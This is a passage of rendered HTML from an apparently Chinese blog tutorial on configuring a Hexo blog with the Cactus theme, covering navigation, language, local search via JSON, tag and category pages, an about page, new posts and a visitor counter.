class=\"comment\">#相当于 启动服务 hexo server</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"新建一个导航栏的项\"><a href=\"#新建一个导航栏的项\" class=\"headerlink\" title=\"新建一个导航栏的项\"></a>新建一个导航栏的项</h2><p>在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav</p>\n<p><img src=\"C-a5CXYmE9OHOUAtBMIgp_FvbBJmTlQW6DqHBr2Sf7o.png\" alt=\"image\"></p>\n<p><img src=\"Nb5nWx1QkeQdj5eanykeR44MqMoc4Mp-Zr4Skuk_I7A.png\" alt=\"image\"></p>\n<h2 id=\"更换语言类型\"><a href=\"#更换语言类型\" class=\"headerlink\" title=\"更换语言类型\"></a>更换语言类型</h2><p>更换项目的_config.yml 为下面的内容即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Site</span></span><br><span class=\"line\">title: 兀自</span><br><span class=\"line\">subtitle: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">description: <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">keywords:</span><br><span class=\"line\">author: Garckz</span><br><span class=\"line\">language: zh-CN</span><br><span class=\"line\">timezone: <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"修改欢迎页面的内容\"><a href=\"#修改欢迎页面的内容\" class=\"headerlink\" title=\"修改欢迎页面的内容\"></a>修改欢迎页面的内容</h2><p>先查看你language用的语言模板，这里是：zh-CN</p>\n<p>所以修改主题文件夹下面的language文件下面的zh-CN.yml文件的内容即可。</p>\n<h2 id=\"添加搜索-XML\"><a href=\"#添加搜索-XML\" class=\"headerlink\" title=\"添加搜索(XML)\"></a>添加搜索(XML)</h2><p>先在在.&#x2F;themes&#x2F;cactus&#x2F;_config.yml找到nav添加一个标签。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br><span class=\"line\">  articles: /archives/</span><br><span class=\"line\">  projects: http://github.com/probberechts</span><br><span class=\"line\">  search: /search/</span><br></pre></td></tr></table></figure>\n<p>用到了 <a href=\"https://github.com/wzpan/hexo-generator-search\" title=\"hexo-generator-search\">hexo-generator-search</a> 的 Hexo 插件来做内容搜索，安装命令如下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>\n<p><img src=\"A_G15Imlu2VdAlS_XN-XiIyTocPIenmtwXRqJwje_pM.png\" alt=\"image\"></p>\n<p>执行下面命令创建一个</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page search</span><br></pre></td></tr></table></figure>\n<p>进入项目地址下的source&#x2F;search&#x2F;index.md，修改md文件的头为</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: Search</span><br><span class=\"line\"><span class=\"built_in\">type</span>: search</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p><img src=\"uP6XsJwwD34izTmKUtWbOB8jrWpXSv00OmjGd2f6a6Y.png\" alt=\"image\"></p>\n<p>出现页面之后，搜索到的内容不可以超链接点过去访问，这时候需要进行以下的配置。</p>\n<p><strong>配置1</strong></p>\n<p>在项目下的 <code>_config.yml</code> 文件中，新增以下的配置项：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Search</span></span><br><span class=\"line\"><span class=\"attr\">search:</span></span><br><span class=\"line\">  <span class=\"attr\">path:</span> <span class=\"string\">search.xml</span></span><br><span class=\"line\">  <span class=\"attr\">field:</span> <span class=\"string\">post</span></span><br><span class=\"line\">  <span class=\"attr\">content:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">format:</span> <span class=\"string\">html</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"KUhFEBqwSuss11_P-eGBshQhrbDC2W5_BWp0MMtB65I.png\" alt=\"image\"></p>\n<ul>\n<li><p>path：表示搜索后生成的文件路径，可以生成xml和json两种格式。</p>\n</li>\n<li><p>field：表示搜索的范围，有“​​post、page和all​​”三种值。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">post：所有的文章；</span><br><span class=\"line\">page：所有顶部导航选项的页面；</span><br><span class=\"line\">all：所有的文章和顶部导航选项的页面。</span><br></pre></td></tr></table></figure>\n<ul>\n<li>content：是否包含搜索到的文章的全部内容。如果false，生成的结果只包括标题和创建时间这些信息，没有文章主体。默认情况下是true.</li>\n<li>format：搜索到的内容、选项的格式。</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">html(默认)：将html原文本缩略。</span><br><span class=\"line\">striptags：将html原文本缩略，并删除所有标记。</span><br><span class=\"line\">raw：记下每一篇文章或每一页的文字。</span><br></pre></td></tr></table></figure>\n\n\n<p><strong>配置2</strong></p>\n<p>主题文件下_config.yml文件添加下面的内容</p>\n<p> all：所有的文章和顶部导航选项的页面。</p>\n<p><img src=\"DrgbW9P7qj4biCTE_A4c6ObM-l6QlTw4E_tkh3PLgMI.png\" alt=\"image\"></p>\n<h2 id=\"添加搜索（JSON）\"><a href=\"#添加搜索（JSON）\" class=\"headerlink\" title=\"添加搜索（JSON）\"></a>添加搜索（JSON）</h2><p>上面我们使用.xml的方式做搜索。偶时候链接错误，出现undefined。</p>\n<p>网上的说法是：某些文章有格式问题，导致生成的search.xml也出错了。</p>\n<p>下面我们使用json格式的方式来实现该功能。</p>\n<h3 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h3><p>在项目的_config.yml文件中把search.xml修改为search.json</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.xml</span><br><span class=\"line\">  field: post</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br></pre></td></tr></table></figure>\n<h3 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h3><p>找到主题的search.ejs模板文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;search.ejs</p>\n<p>我这里的这个主题不需要修改。其它主题的修改方式：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.xml&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>修改为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"built_in\">type</span>=<span class=\"string\">&quot;text/javascript&quot;</span>&gt;</span><br><span class=\"line\">$(<span class=\"function\"><span class=\"title\">function</span></span> () &#123;</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;lets go！&quot;</span>);</span><br><span class=\"line\">    console.log(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span>);</span><br><span class=\"line\">    searchFunc(<span class=\"string\">&quot;&lt;%= config.root %&gt;&quot;</span> + <span class=\"string\">&quot;search.json&quot;</span>, <span class=\"string\">&#x27;searchInput&#x27;</span>, <span class=\"string\">&#x27;searchResult&#x27;</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<h3 id=\"最后一步\"><a href=\"#最后一步\" class=\"headerlink\" title=\"最后一步\"></a>最后一步</h3><p>修改你的search的本地js文件，我这里的路径是：themes&#x2F;hexo-theme-cactus&#x2F;source&#x2F;js&#x2F;search.js</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">原本：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">修改为：</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">还需要注释掉：</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br></pre></td></tr></table></figure>\n<p>最终结果为：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">// A <span class=\"built_in\">local</span> search script with the <span class=\"built_in\">help</span> of</span><br><span class=\"line\">// [hexo-generator-search](https://github.com/PaicHyperionDev/hexo-generator-search)</span><br><span class=\"line\">// Copyright (C) 2015</span><br><span class=\"line\">// Joseph Pan &lt;http://github.com/wzpan&gt;</span><br><span class=\"line\">// Shuhao Mao &lt;http://github.com/maoshuhao&gt;</span><br><span class=\"line\">// This library is free software; you can redistribute it and/or modify</span><br><span class=\"line\">// it under the terms of the GNU Lesser General Public License as</span><br><span class=\"line\">// published by the Free Software Foundation; either version 2.1 of the</span><br><span class=\"line\">// License, or (at your option) any later version.</span><br><span class=\"line\">//</span><br><span class=\"line\">// This library is distributed <span class=\"keyword\">in</span> the hope that it will be useful, but</span><br><span class=\"line\">// WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class=\"line\">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU</span><br><span class=\"line\">// Lesser General Public License <span class=\"keyword\">for</span> more details.</span><br><span class=\"line\">//</span><br><span class=\"line\">// You should have received a copy of the GNU Lesser General Public</span><br><span class=\"line\">// License along with this library; <span class=\"keyword\">if</span> not, write to the Free Software</span><br><span class=\"line\">// Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA</span><br><span class=\"line\">// 02110-1301 USA</span><br><span class=\"line\">//</span><br><span class=\"line\">// Modified by:</span><br><span class=\"line\">// Pieter Robberechts &lt;http://github.com/probberechts&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">/*exported searchFunc*/</span><br><span class=\"line\">var searchFunc = <span class=\"keyword\">function</span>(path, searchId, contentId) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> stripHtml(html) &#123;</span><br><span class=\"line\">    html = html.replace(/&lt;style([\\s\\S]*?)&lt;\\/style&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;script([\\s\\S]*?)&lt;\\/script&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;figure([\\s\\S]*?)&lt;\\/figure&gt;/gi, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/div&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/li&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;li&gt;/ig, <span class=\"string\">&quot;  *  &quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/ul&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;\\/p&gt;/ig, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;br\\s*[\\/]?&gt;/gi, <span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    html = html.replace(/&lt;[^&gt;]+&gt;/ig, <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> html;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">function</span> getAllCombinations(keywords) &#123;</span><br><span class=\"line\">    var i, j, result = [];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = 0; i &lt; keywords.length; i++) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = i + 1; j &lt; keywords.length + 1; j++) &#123;</span><br><span class=\"line\">            result.push(keywords.slice(i, j).<span class=\"built_in\">join</span>(<span class=\"string\">&quot; &quot;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  $.ajax(&#123;</span><br><span class=\"line\">    url: path,</span><br><span class=\"line\">    // dataType: <span class=\"string\">&quot;xml&quot;</span>,</span><br><span class=\"line\">    dataType: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">    //success: <span class=\"keyword\">function</span>(xmlResponse) &#123;</span><br><span class=\"line\">    success: <span class=\"keyword\">function</span>(datas) &#123;</span><br><span class=\"line\">      // get the contents from search data</span><br><span class=\"line\">      // var datas = $(<span class=\"string\">&quot;entry&quot;</span>, xmlResponse).map(<span class=\"function\"><span class=\"title\">function</span></span>() &#123;</span><br><span class=\"line\">      //   <span class=\"built_in\">return</span> &#123;</span><br><span class=\"line\">      //     title: $(<span class=\"string\">&quot;title&quot;</span>, this).text(),</span><br><span class=\"line\">      //     content: $(<span class=\"string\">&quot;content&quot;</span>, this).text(),</span><br><span class=\"line\">      //     url: $(<span class=\"string\">&quot;link&quot;</span>, this).attr(<span class=\"string\">&quot;href&quot;</span>)</span><br><span class=\"line\">      //   &#125;;</span><br><span class=\"line\">      // &#125;).get();</span><br><span class=\"line\"></span><br><span class=\"line\">      var <span class=\"variable\">$input</span> = document.getElementById(searchId);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!<span class=\"variable\">$input</span>) &#123; <span class=\"built_in\">return</span>; &#125;</span><br><span class=\"line\">      var <span class=\"variable\">$resultContent</span> = document.getElementById(contentId);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"variable\">$input</span>.addEventListener(<span class=\"string\">&quot;input&quot;</span>, <span class=\"function\"><span class=\"title\">function</span></span>()&#123;</span><br><span class=\"line\">        var resultList = [];</span><br><span class=\"line\">        var keywords = getAllCombinations(this.value.trim().toLowerCase().<span class=\"built_in\">split</span>(<span class=\"string\">&quot; &quot;</span>))</span><br><span class=\"line\">          .<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a,b) &#123; <span class=\"built_in\">return</span> b.split(<span class=\"string\">&quot; &quot;</span>).length - a.split(<span class=\"string\">&quot; &quot;</span>).length; &#125;);</span><br><span class=\"line\">        <span class=\"variable\">$resultContent</span>.innerHTML = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (this.value.trim().length &lt;= 0) &#123;</span><br><span class=\"line\">          <span class=\"built_in\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        // perform <span class=\"built_in\">local</span> searching</span><br><span class=\"line\">        datas.forEach(<span class=\"keyword\">function</span>(data) &#123;</span><br><span class=\"line\">          var matches = 0;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!data.title || data.title.trim() === <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            data.title = <span class=\"string\">&quot;Untitled&quot;</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          var dataTitle = data.title.trim().toLowerCase();</span><br><span class=\"line\">          var dataTitleLowerCase = dataTitle.toLowerCase();</span><br><span class=\"line\">          var dataContent = stripHtml(data.content.trim());</span><br><span class=\"line\">          var dataContentLowerCase = dataContent.toLowerCase();</span><br><span class=\"line\">          var dataUrl = data.url;</span><br><span class=\"line\">          var indexTitle = -1;</span><br><span class=\"line\">          var indexContent = -1;</span><br><span class=\"line\">          var firstOccur = -1;</span><br><span class=\"line\">          // only match artiles with not empty contents</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (dataContent !== <span class=\"string\">&quot;&quot;</span>) &#123;</span><br><span class=\"line\">            keywords.forEach(<span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">              indexTitle = dataTitleLowerCase.indexOf(keyword);</span><br><span class=\"line\">              indexContent = dataContentLowerCase.indexOf(keyword);</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>( indexTitle &gt;= 0 || indexContent &gt;= 0 )&#123;</span><br><span class=\"line\">                matches += 1;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (indexContent &lt; 0) &#123;</span><br><span class=\"line\">                  indexContent = 0;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (firstOccur &lt; 0) &#123;</span><br><span class=\"line\">                  firstOccur = indexContent;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          // show search results</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (matches &gt; 0) &#123;</span><br><span class=\"line\">            var searchResult = &#123;&#125;;</span><br><span class=\"line\">            searchResult.rank = matches;</span><br><span class=\"line\">            searchResult.str = <span class=\"string\">&quot;&lt;li&gt;&lt;a href=&#x27;&quot;</span>+ dataUrl +<span class=\"string\">&quot;&#x27; class=&#x27;search-result-title&#x27;&gt;&quot;</span>+ dataTitle +<span class=\"string\">&quot;&lt;/a&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (firstOccur &gt;= 0) &#123;</span><br><span class=\"line\">              // <span class=\"built_in\">cut</span> out 100 characters</span><br><span class=\"line\">              var start = firstOccur - 20;</span><br><span class=\"line\">              var end = firstOccur + 80;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start &lt; 0)&#123;</span><br><span class=\"line\">                start = 0;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(start == 0)&#123;</span><br><span class=\"line\">                end = 100;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"keyword\">if</span>(end &gt; dataContent.length)&#123;</span><br><span class=\"line\">                end = dataContent.length;</span><br><span class=\"line\">              &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              var matchContent = dataContent.substring(start, end);</span><br><span class=\"line\"></span><br><span class=\"line\">              // highlight all keywords</span><br><span class=\"line\">              var regS = new RegExp(keywords.join(<span class=\"string\">&quot;|&quot;</span>), <span class=\"string\">&quot;gi&quot;</span>);</span><br><span class=\"line\">              matchContent = matchContent.replace(regS, <span class=\"keyword\">function</span>(keyword) &#123;</span><br><span class=\"line\">                <span class=\"built_in\">return</span> <span class=\"string\">&quot;&lt;em class=\\&quot;search-keyword\\&quot;&gt;&quot;</span>+keyword+<span class=\"string\">&quot;&lt;/em&gt;&quot;</span>;</span><br><span class=\"line\">              &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">              searchResult.str += <span class=\"string\">&quot;&lt;p class=\\&quot;search-result\\&quot;&gt;&quot;</span> + matchContent +<span class=\"string\">&quot;...&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            searchResult.str += <span class=\"string\">&quot;&lt;/li&gt;&quot;</span>;</span><br><span class=\"line\">            resultList.push(searchResult);</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (resultList.length) &#123;</span><br><span class=\"line\">          resultList.<span class=\"built_in\">sort</span>(<span class=\"keyword\">function</span>(a, b) &#123;</span><br><span class=\"line\">              <span class=\"built_in\">return</span> b.rank - a.rank;</span><br><span class=\"line\">          &#125;);</span><br><span class=\"line\">          var result =<span class=\"string\">&quot;&lt;ul class=\\&quot;search-result-list\\&quot;&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">for</span> (var i = 0; i &lt; resultList.length; i++) &#123;</span><br><span class=\"line\">            result += resultList[i].str;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          result += <span class=\"string\">&quot;&lt;/ul&gt;&quot;</span>;</span><br><span class=\"line\">          <span class=\"variable\">$resultContent</span>.innerHTML = result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<p>最终项目的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">search:</span><br><span class=\"line\">  path: search.json</span><br><span class=\"line\">  field: post</span><br><span class=\"line\">  content: <span class=\"literal\">true</span></span><br><span class=\"line\">  format: html</span><br><span class=\"line\">  <span class=\"built_in\">limit</span>: 10000</span><br></pre></td></tr></table></figure>\n<p>最终主题的_config.yml</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">local_search:</span><br><span class=\"line\">  <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"comment\"># auto表示改变输入就自动触发搜索</span></span><br><span class=\"line\">  <span class=\"comment\"># manual表示按下回车键或搜索按钮才触发搜索</span></span><br><span class=\"line\">  trigger: auto</span><br><span class=\"line\">  <span class=\"comment\"># 这里的数字n表示显示每篇文章搜索到的n个结果</span></span><br><span class=\"line\">  <span class=\"comment\"># -1表示显示每篇文章搜索到的全部结果(不建议)</span></span><br><span class=\"line\">  top_n_per_article: 1</span><br></pre></td></tr></table></figure>\n<h2 id=\"添加标签页\"><a href=\"#添加标签页\" class=\"headerlink\" title=\"添加标签页\"></a>添加标签页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page tags</span><br></pre></td></tr></table></figure>\n<p><img src=\"h1edlshktmHLnU9E-Xc1KebtW5e99chfzA5x7te3wSk.png\" alt=\"image\"></p>\n<p>根据上面的路径，找到index.md这个文件</p>\n<p>添加type: “tags” layout: “tags”到内容中，添加后是这样的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: tags</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:30:23</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">layout: <span class=\"string\">&quot;tags&quot;</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"标签页实现标签云效果\"><a href=\"#标签页实现标签云效果\" class=\"headerlink\" title=\"标签页实现标签云效果\"></a>标签页实现标签云效果</h3><p>安装插件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm install hexo-tag-cloud  --save</span><br></pre></td></tr></table></figure>\n<p>找到 tagcloud.ejs 文件，完整路径：</p>\n<p>修改为以下内容：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"文章添加标签\"><a href=\"#文章添加标签\" class=\"headerlink\" title=\"文章添加标签\"></a>文章添加标签</h3><p>在每篇文章的头部添加</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br></pre></td></tr></table></figure>\n<p><img src=\"RXQ6UuEFKLy3acWISocGXpbos58iF4Oyf40e6MiOpm0.png\" alt=\"image\"></p>\n<h2 id=\"新分类页\"><a href=\"#新分类页\" class=\"headerlink\" title=\"新分类页\"></a>新分类页</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page categories</span><br></pre></td></tr></table></figure>\n<p>添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 23:32:13</span><br><span class=\"line\"><span class=\"built_in\">type</span>: <span class=\"string\">&quot;categories&quot;</span></span><br><span class=\"line\">comments: <span class=\"literal\">false</span></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>type</strong> 字段用来指定页面类型，<strong>comments</strong> 字段用来指定该页面是否显示评论。</p>\n<p>主题文件的_config.yml的nav添加个导航栏</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">category: /categories/</span><br></pre></td></tr></table></figure>\n<p>striptags：将html原文本缩略，并删除所有标记。</p>\n<p>先新建一个导航栏标签；在主题模板文件的_config.yml文件中设置</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">nav:</span><br><span class=\"line\">  home: /</span><br><span class=\"line\">  about: /about/</span><br></pre></td></tr></table></figure>\n<h2 id=\"创建about页面\"><a href=\"#创建about页面\" class=\"headerlink\" title=\"创建about页面\"></a>创建about页面</h2><p>新建一个about的页面</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new page about</span><br></pre></td></tr></table></figure>\n<p>添加一些内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: about</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:49:29</span><br><span class=\"line\"><span class=\"built_in\">type</span>: about</span><br><span class=\"line\">---</span><br><span class=\"line\"><span class=\"comment\">### 单体应用存在的问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">- 随着业务的发展，开发变得越来越复杂。</span><br><span class=\"line\">- 修改、新增某个功能，需要对整个系统进行测试、重新部署。</span><br></pre></td></tr></table></figure>\n<p><img src=\"OMQaMoHEHKbp9hWjVkGDr_ImQo-eqhnO_1Kz8eCaoio.png\" alt=\"image\"></p>\n<h2 id=\"新建文章\"><a href=\"#新建文章\" class=\"headerlink\" title=\"新建文章\"></a>新建文章</h2><p>方法1：</p>\n<p>定位到我们项目的根目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">hexo new <span class=\"string\">&#x27;my-first-blog&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>hexo会帮我们在“项目\\source\\_posts”下生成相关.md文件</p>\n<p><img src=\"I6B9MllFXPDmu5BESAms0VYvcirUV-Wp8QyPlquzN6U.png\" alt=\"image\"></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: my-first-blog</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2023-04-29 21:40:49</span><br><span class=\"line\">tags:</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>方法2：</p>\n<p>直接自己打开“项目\\source\\_posts”新建.md文件</p>\n<p>在书写的文章头添加上日期即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">title: Tags and Categories</span><br><span class=\"line\"><span class=\"built_in\">date</span>: 2017-12-24 23:29:53</span><br><span class=\"line\">tags:</span><br><span class=\"line\">- Foo</span><br><span class=\"line\">- Bar</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"BSXKfFqVvy9gbD0QiMuzv7Pr0zlOFyqPeRa51pvli0Y.png\" alt=\"image\"></p>\n<h2 id=\"博客访问量统计\"><a href=\"#博客访问量统计\" class=\"headerlink\" title=\"博客访问量统计\"></a>博客访问量统计</h2><p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;_config.yml添加下面一段代码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 是否开启访问量统计功能(不蒜子)</span></span><br><span class=\"line\">busuanzi:</span><br><span class=\"line\"> <span class=\"built_in\">enable</span>: <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>进入.&#x2F;themes&#x2F;hexo-theme-cactus&#x2F;layout&#x2F;_partial&#x2F;footer.ejs将添加下面内容</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;footer <span 